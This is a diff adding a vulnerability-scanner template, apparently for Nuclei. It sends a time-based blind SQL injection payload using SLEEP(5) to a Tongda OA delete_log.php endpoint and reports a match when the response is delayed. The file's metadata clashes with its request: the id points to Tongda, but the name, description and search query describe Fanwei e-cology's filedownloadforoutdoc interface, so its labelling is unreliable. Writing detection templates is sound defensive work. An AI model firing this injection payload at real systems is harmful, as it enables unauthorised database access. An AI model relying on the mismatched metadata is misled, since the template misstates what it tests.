@@ -1,0 +1,24 @@
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - duration>=5
+    - status_code == 200
+    type: dsl
+  method: GET
+  path:
+  - '{{BaseURL}}/general/system/seal_manage/dianju/delete_log.php?DELETE_STR=1) and
+    IF(1=1, SLEEP(5), 0) and (1)=(1)'
+id: tongda-delete-seal-sqli
+info:
+  author: Co5mos
+  description: EcologyOA filedownloadforoutdoc interface has SQL injection
+  metadata:
+    hunter-query: "product.name=\"\u6CDB\u5FAE e-cology 9.0 OA\""
+    max-request: 2
+    verified: true
+  name: EcologyOA filedownloadforoutdoc - SQL injection
+  reference:
+  - https://blog.csdn.net/2301_79099363/article/details/131692158
+  severity: critical
+  tags: ecology-oa,sqli
